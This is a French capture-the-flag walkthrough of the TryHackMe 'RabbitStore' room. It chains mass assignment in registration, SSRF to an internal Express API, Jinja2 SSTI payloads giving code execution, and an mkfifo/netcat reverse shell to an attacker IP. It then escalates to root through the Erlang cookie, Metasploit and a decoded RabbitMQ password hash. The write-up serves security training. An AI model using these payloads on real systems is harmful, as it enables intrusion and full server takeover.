# ROOM : 
RabbitStore

# Infos
Un VM medium, mais je l'ai trouve hard perso. Enormement de recherche pour arriver à mes fins !

# Enumeration
Quand je vais sur l'ip, ca force l'utilisation du DNS **cloudsite.thm**, on va donc l'ajouter dans le fichier **/etc/hosts** 
```
10.10.119.93    cloudsite.thm
```
On peux créer un compte, il faut visiblement ajouter le sous-dommaine **storage.cloudsite.thm** je l'ajoute dans aussi dans le fichier hosts.
J'en profite pour chercher d'autre sous domaine :
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cloudsite.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                             
=====================================================================

000000479:   200        262 L    501 W      9039 Ch     "storage"                                                                                                           

Total time: 18.39210
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 271.2576

```
Visiblement, pas d'autre sous domaine (du moins, pas présent dans la liste que j'ai pris).

## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-14 10:59 EDT
Nmap scan report for cloudsite.thm (10.10.119.93)
Host is up (0.035s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.40 seconds
```
- 22 SSH
- 80 HTTP
- 4369 EPMD (Erlang)
- 25672 node Rabbit

# Recherches et exploitation
On peux créer un compte, je test mais j'ai ce message :
```
Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
```
On peux aussi envoyer un message via le formulaire de contact mais c'est inactif.

Sur le site on vois ces 2 emails :
``` 
info@smarteyeapps.com
sales@smarteyeapps.com
```
Je test de créer un compte avec le domaine **@smarteyeapps.com** mais maintenant, j'ai une erreur => username / password invalide

Il y a 2 potentiels users : 
```
williamson@smarteyeapp.com
kristina@smarteyeapps.com
```
Je test un bruteforce avec Hydra mais ce n'est pas concluant.

Il y a un token JWT, le payload est ainsi :
```
{
  "email": "test@test.com",
  "subscription": "inactive",
  "iat": 1741965465,
  "exp": 1741969065
}
```
Je test de le passer en **active** et de renvoyé la requête mais cela ne fonctionne pas.
Je vais test de créer un compte qui est déjà actif
```
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 74
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAc21hcnRleWVhcHBzLmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQxOTY5MTc5LCJleHAiOjE3NDE5NzI3Nzl9.81_IoL2b3q6eaM2zO_sFSTozAeFaJFPvZRpNVziZswc
Priority: u=0

{"email":"blabla@test.com","password":"test",
"subscription": "active"
}
```
Il créer bien le compte :
```
HTTP/1.1 201 Created
Date: Fri, 14 Mar 2025 16:27:11 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 42
ETag: W/"2a-nMoFx54+czTntmSLXl3mqIsZV4A"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"message":"User registered successfully"}
```
J'ai accès au site, il permet l'envoi d'un fichier.
Je vais test d'envoyer un shell php, pour cela j'utilise le php-reverse-shell de pentestmonkey.

Il l'envoi bien :
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:32:44 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 100
ETag: W/"64-MzTMvfiAcrg1Kb75vyoKFRU8WmY"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"message":"Image uploaded successfully","path":"/api/uploads/64ecfb15-711c-486b-afc5-47e0045c602d"}
```
Mais ca télécharge le shell et ne l'execute pas.

On peux aussi upload via une URL :
```
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 38
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
Priority: u=0

{"url":"http://10.14.97.127/test.txt"}
```
Résultat : 
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:44:05 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 106
ETag: W/"6a-4yuvrfo2qhGjwt0S/+mVTtgnKMQ"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"message":"File stored from URL successfully","path":"/api/uploads/3436b178-0437-4416-9e04-fc73eab848ad"}
```
Et quand je fait un GET sur l'URL j'ai bien le contenu de mon fichier :
```
GET /api/uploads/3436b178-0437-4416-9e04-fc73eab848ad HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
Oui j'ai beaucoup d'inspiration ;)
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:44:14 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 14 Mar 2025 16:44:05 GMT
ETag: W/"b-195958aa0a8"
Content-Type: application/octet-stream
Content-Length: 11
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

gegegeggeg

```
Je vois qu'il y a une API, on va test de la fuzz pour voir les paramètres qu'elle peux accepter.
```
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 72ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 71ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 84ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 107ms]
```
register,login et uploads, je les connais mais docs non.
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/RabbitStore]
└─$ curl -v -b "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k" http://storage.cloudsite.thm/api/docs 
* Host storage.cloudsite.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.119.93
*   Trying 10.10.119.93:80...
* Connected to storage.cloudsite.thm (10.10.119.93) port 80
* using HTTP/1.x
> GET /api/docs HTTP/1.1
> Host: storage.cloudsite.thm
> User-Agent: curl/8.12.1
> Accept: */*
> Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
> 
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Date: Fri, 14 Mar 2025 16:38:12 GMT
< Server: Apache/2.4.52 (Ubuntu)
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 27
< ETag: W/"1b-iBx/SnAbP76moSKyn7jijRK2KE8"
< 
* Connection #0 to host storage.cloudsite.thm left intact
{"message":"Access denied"}
```
J'ai un accès refusé, mais je peux upload depuis un URL, je vais tenter une SSRF (*Server Side Request Forgery*).
```
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 47
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
Priority: u=0

{"url":"http://storage.cloudsite.thm/api/docs"}
```
Ca me l'upload bien, mais j'ai toujours un accès refusé....
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:49:16 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 14 Mar 2025 16:48:59 GMT
ETag: W/"1b-195958f1e38"
Content-Type: application/octet-stream
Content-Length: 27
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{"message":"Access denied"}
```
On va test avec **127.0.0.1** au lieu de **cloudsite.thm** ce qui permettra surement de contourner le blocage
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:51:07 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 14 Mar 2025 16:50:57 GMT
ETag: W/"113-1959590ec30"
Content-Type: application/octet-stream
Content-Length: 275
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
</body></html>
```
Y'a une réponse, bon c'est une erreur 404 mais il y a une réponse. Cependant il y a quand même un truc utile dont je n'avais pas fait attention avant:
```
X-Powered-By: Express
```
Le site utilise le framework [Express](https://expressjs.com/)
Le port par defaut est le **3000** selon la documentation, on va test d'upload avec l'URL **http://127.0.0.1:3000/api/docs**
```
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 35
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
Priority: u=0

{"url":"http://127.0.0.1:3000/api/docs"}
```
Et cela fonctionne !
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 16:54:51 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 14 Mar 2025 16:54:38 GMT
ETag: W/"233-19595944920"
Content-Type: application/octet-stream
Content-Length: 563
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```
On peux visiblement envoyé des données JSON vers **/api/fetch_messeges_from_chatbot**, on va test.
```
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImJsYWJsYUB0ZXN0LmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0MTk2OTc1OCwiZXhwIjoxNzQxOTczMzU4fQ.1y3OdontXbJqOngILwBhJ-qz0jQU_kTvZrMdIJIyc3k
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json; charset=utf-8
Content-Length: 12

{
	"":""
}
```
```
HTTP/1.1 200 OK
Date: Fri, 14 Mar 2025 17:03:06 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 48
ETag: W/"30-HRIDikR9Rsmd3ZTyOjz4OFirGCM"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
  "error": "username parameter is required"
}
```
On peux donc visiblement discuter avec ce chatbot :D, j'essaye avec un compte "Admin" pour voir
*Je retire le surplu et affiche seulement les payloads et les retours*
```
{
	"username":"admin"
}
```
```
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, admin, our chatbot server is currently under development.</h1>
 </body>
</html>
```
Hummmm

On va test une SSTI :
```
{
	"username":"{{7*7}}"
}
```
```
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, 49, our chatbot server is currently under development.</h1>
 </body>
</html>
```
Il fait bien l'opération 7x7=49, le paramètre **username** et vulnérable à une SSTI (*Server Side Template Injection*). On test encore :
```
{
	"username":"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
}
```
```
<html lang=en>
  <head>
    <title>jinja2.exceptions.UndefinedError: &#39;_self&#39; is undefined
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    [...]
```
Bon, j'ai le nom de l'user :
```
[...]
File <cite class="filename">"/home/azrael/.local/lib/python3.10/site-packages/flask/app.py"</cite>
[...]
```
Et je sais aussi qu'il y a serveur avec **jinja2** qui tourne avec python, on va donc envoyé des payloads python (Les payloads que je test viennent de PayloadsAllTheThings)
```
{
	"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
}
```
```
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
, our chatbot server is currently under development.</h1>
 </body>
</html>
```
On peux donc faire une RCE (*Remote Code Execution*) et avoir un shell
```
{
	"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.14.97.127 4444 >/tmp/f').read() }}"
}
```
Et nous voila avec un shell sur le serveur:
```     
listening on [any] 4444 ...
connect to [10.14.97.127] from (UNKNOWN) [10.10.119.93] 46130
bash: cannot set terminal process group (605): Inappropriate ioctl for device
bash: no job control in this shell
azrael@forge:~/chatbotServer$
```
On vois un script python.py :
```python
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    if not data or 'username' not in data:
        return jsonify({"error": "username parameter is required"}), 400
    
    username = data['username']
    template = '''<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, {}, our chatbot server is currently under development.</h1>
 </body>
</html>'''.format(username)
    
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=8000)
```
La SSTI ce trouve ici :
```
</html>'''.format(username)
```
La variable python **username** est inséré dans le template HTML, nous pouvons donc injecter du code dans la variable qui sera executer. 

# Privesc to Root :)
J'ai un peu tout check, puis je me suis rappeler du résultat de nmap
```
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
```
Il y a un module dans metasploit pour avoir une RCE avec Erlang.
```
exploit/multi/misc/erlang_cookie_rce
```
Il faut le cookie pour l'exploiter, on va essayer de retrouver cela. 
Le nom du fichier qui contient le cookie est **.erlang.cookie**
```
azrael@forge:/usr/bin$ find / -name .erlang.cookie 2</dev/null
/var/lib/rabbitmq/.erlang.cookie
```
J'ai le cookie !
```
Cpz9[...]msg
```
On configure le payload puis on envoi :
```
msf6 exploit(multi/misc/erlang_cookie_rce) > run
[*] Started reverse TCP double handler on 10.14.97.127:4445 
[*] 10.10.119.93:25672 - Receiving server challenge
[*] 10.10.119.93:25672 - Sending challenge reply
[+] 10.10.119.93:25672 - Authentication successful, sending payload
[*] 10.10.119.93:25672 - Exploiting...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo UZsHymI3BqHDRtRr;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "UZsHymI3BqHDRtRr\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.14.97.127:4445 -> 10.10.119.93:59840) at 2025-03-14 13:43:19 -0400
```
j'ai le shell de rabbitmq
```
uid=124(rabbitmq) gid=131(rabbitmq) groups=131(rabbitmq)
rabbitmq@forge:~$ 
```
Je trouve un truc interessant :
```
rabbitmq@forge:~/mnesia/rabbit@forge$ cat rabbit_user.DCD
cat rabbit_user.DCD
cXM
   ������������IbWLA�hd����
log_headerd����dcd_logk����1.0k����4.16.2d����
                                              rabbit@forgehb���������b����\2b����
internal_userm�������������The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.m������������$�'����I27~���:�?�����p6F���
internal_userm������������rootm������������$�׺��|bWLA�hd����
```
Ca parle du root, je pense que je ne suis plus très loin. Je vais essayer avec RabbitMQ de lire ce fichier

Pendant mes recherches je trouve un client qui permet de contacter l'instance RabbitMQ avec le cookie Erlang avec l'argument **--erlang-cookie**!
Voir [ici](https://www.rabbitmq.com/docs/man/rabbitmqctl.8)

J'installe donc le client et test :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/RabbitStore]
└─$ sudo rabbitmqctl --erlang-cookie 'Cpz9[...]msg' --node rabbit@forge export_definitions /home/kali/Challenge/TryHackMe/RabbitStore/users.json
```
Ca fonctionne pas. Ca fonctionne pas car il ne connais pas **forge**, je vais l'ajouter au fichier **/etc/hosts**
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/RabbitStore]
└─$ sudo rabbitmqctl --erlang-cookie 'Cpz9[...]msg' --node rabbit@forge export_definitions /home/kali/Challenge/TryHackMe/RabbitStore/users.json
Exporting definitions in JSON to a file at "/home/kali/Challenge/TryHackMe/RabbitStore/users.json" ...
Stack trace: 

** (UndefinedFunctionError) function JSON.encode/1 is undefined or private
    (elixir 1.18.1) JSON.encode(%{permissions: [%{"configure" => ".*", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], bindings: [], queues: [%{"arguments" => %{}, "auto_delete" => false, "durable" => true, "name" => "tasks", "type" => :classic, "vhost" => "/"}], parameters: [], policies: [], rabbitmq_version: "3.9.13", exchanges: [], global_parameters: [%{"name" => :cluster_name, "value" => "rabbit@forge"}], rabbit_version: "3.9.13", topic_permissions: [%{"exchange" => "", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], users: [%{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.", "password_hash" => "vyf4qvKL[...]yN34K", "tags" => []}, %{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "root", "password_hash" => "49e6h[...]HtGU+YBzWF", "tags" => ["administrator"]}], vhosts: [%{"limits" => [], "metadata" => %{description: "Default virtual host", tags: []}, "name" => "/"}]})
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:154: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.serialise/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:76: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.run/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:174: RabbitMQCtl.maybe_run_command/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:142: anonymous fn/5 in RabbitMQCtl.do_exec_parsed_command/5
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:642: RabbitMQCtl.maybe_with_distribution/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:107: RabbitMQCtl.exec_command/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:41: RabbitMQCtl.main/1

Error:
:undef

```
Ca fonctionne !!!!!!!!! On a le hash de root !!!!
C'est du base64, regardons :
```
echo "49e6hSl[...]GU+YBzWF" | base64 -d
�׺�)]�a}���c'�/�\C���aH�O�5�
```
Bon, en regardant la doc de [Rabbitmq](https://www.rabbitmq.com/docs/passwords)
On vois qu'il y a aussi de l'hexa.. On va donc utiliser **xxd** qui permet de faire des dump hexadécimaux.
```
echo -n '49e6hSl[...]GU+YBzWF' | base64 -d | xxd -p
```
```
┌──(kali㉿kali)-[~/Scripts]
└─$ echo -n '49e6hSl[...]GU+YBzWF' | base64 -d | xxd -p       
e3d7ba8529[...]43b3f6ec614811ed
194f98073585
```
Ce qui nous donne: 
```
e3d7ba8529[...]43b3f6ec614811ed194f98073585
```
Cependant, il faut retirer le salt, qui prend 4 octets (soit 8 char)
```
295d1d[...]3585
```
Et nous voici root :
```
su - root
Password: 295d1d[...]3585
id
uid=0(root) gid=0(root) groups=0(root)
```
